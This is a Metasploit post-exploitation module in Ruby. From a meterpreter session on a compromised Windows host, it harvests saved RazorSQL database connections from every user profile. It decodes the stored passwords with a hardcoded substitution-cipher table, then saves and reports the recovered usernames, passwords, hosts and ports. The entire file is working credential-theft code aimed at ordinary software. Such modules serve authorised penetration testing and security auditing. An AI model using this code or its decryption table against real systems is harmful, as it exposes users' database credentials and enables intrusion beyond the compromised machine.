##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/user_profiles'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather RazorSQL Credentials',
      'Description'   => %q{
          This module stores username, password, type, host, port, database (and name)
        collected from profiles.txt of RazorSQL.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Paul Rascagneres <rascagneres[at]itrust.lu>',
          'sinn3r' #Reporting, file parser
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run
    print_status("Checking All Users...")
    creds_tbl = Rex::Ui::Text::Table.new(
      'Header'  => 'RazorSQL User Credentials',
      'Indent'  => 1,
      'Columns' =>
        [
          'Username',
          'Password',
          'Type',
          'Host',
          'Port',
          'Database Name',
          'Database'
        ]
    )

    grab_user_profiles().each do |user|
      next if user['ProfileDir'] == nil
      file= user['ProfileDir'] + "\\.razorsql\\data\\profiles.txt"
      content = get_content(file)
      if content and not content.empty?
        creds = parse_content(creds_tbl, content, user['UserName'])
        creds.each do |c|
          creds_tbl << c
        end
      end
    end

    if not creds_tbl.rows.empty?
      path = store_loot(
        'razor.user.creds',
        'text/csv',
        session,
        creds_tbl.to_s,
        'razor_user_creds.txt',
        'RazorSQL User Credentials'
      )
      print_line(creds_tbl.to_s)
      print_status("User credentials stored in: #{path}")
    else
      print_error("No data collected")
    end
  end

  def get_content(file)
    found    = session.fs.file.stat(file) rescue nil
    return if not found
    content=''
    infile = session.fs.file.new(file, "rb")
    until infile.eof?
      content << infile.read
    end
    return content
  end

  def parse_content(table, content, username)
    creds = []
    print_line("Account: #{username}\n")
    content = content.split(/\(\(Z~\]/)
    content.each do |db|
      database = (db.scan(/database=(.*)/).flatten[0] || '').strip
      user     = (db.scan(/user=(.*)/).flatten[0] || '').strip
      type     = (db.scan(/type=(.*)/).flatten[0] || '').strip
      host     = (db.scan(/host=(.*)/).flatten[0] || '').strip
      port     = (db.scan(/port=(.*)/).flatten[0] || '').strip
      dbname   = (db.scan(/databaseName=(.*)/).flatten[0] || '').strip
      pass     = (db.scan(/password=(.*)/).flatten[0] ||'').strip

      # Decrypt if there's a password
      pass = decrypt(pass) if not pass.empty?

      # Store data
      creds << [user, pass, type, host, port, dbname, database]

      # Reort auth info while dumping data
      report_auth_info(
        :host  => host,
        :port  => port,
        :sname => database,
        :user  => user,
        :pass  => pass,
        :type  => 'password'
      )
    end

    return creds
  end

  def decrypt( encrypted_password )
    magic_key= {
      "/" => "a" , "<" => "b" , ">" => "c" , ":" => "d" , "X" => "e" ,
      "c" => "f" , "W" => "g" , "d" => "h" , "V" => "i" , "e" => "j" ,
      "f" => "k" , "g" => "l" , "U" => "m" , "T" => "n" , "S" => "o" ,
      "n" => "p" , "m" => "q" , "l" => "r" , "k" => "s" , "j" => "t" ,
      "i" => "u" , "h" => "v" , "P" => "w" , "Q" => "x" , "R" => "y" ,
      "o" => "z" , "p" => "A" , "q" => "B" , "r" => "C" , "t" => "D" ,
      "s" => "E" , "L" => "F" , "N" => "G" , "M" => "H" , "O" => "I" ,
      "N" => "J" , "J" => "K" , "v" => "L" , "u" => "M" , "z" => "N" ,
      "y" => "O" , "w" => "P" , "x" => "Q" , "G" => "R" , "H" => "S" ,
      "A" => "T" , "B" => "U" , "D" => "V" , "C" => "W" , "E" => "X" ,
      "F" => "Y" , "I" => "Z" , "?" => "1" , "3" => "2" , "4" => "3" ,
      "5" => "4" , "6" => "5" , "7" => "6" , "8" => "7" , "9" => "8" ,
      "2" => "9" , "." => "0" , "+" => "+" , "\"" => "\"" , "*" => "*" ,
      "%" => "%" , "&" => "&" , "Z" => "/" , "(" => "(" , ")" => ")" ,
      "=" => "=" , "," => "?" , "!" => "!" , "$" => "$" , "-" => "-" ,
      "_" => "_" , "b" => ":" , "0" => "." , ";" => ";" , "1" => "," ,
      "\\" => "\\" , "a" => "<" , "Y" => ">" , "'" => "'" , "^" => "^" ,
      "{" => "{" , "}" => "}" , "[" => "[" , "]" => "]" , "~" => "~" ,
      "`" => "`"
    }
    password=''
    for letter in encrypted_password.chomp.each_char
      password << magic_key[letter]
    end
    return password
  end
end

=begin
http://www.razorsql.com/download.html
Tested on: v5.6.2 (win32)
=end
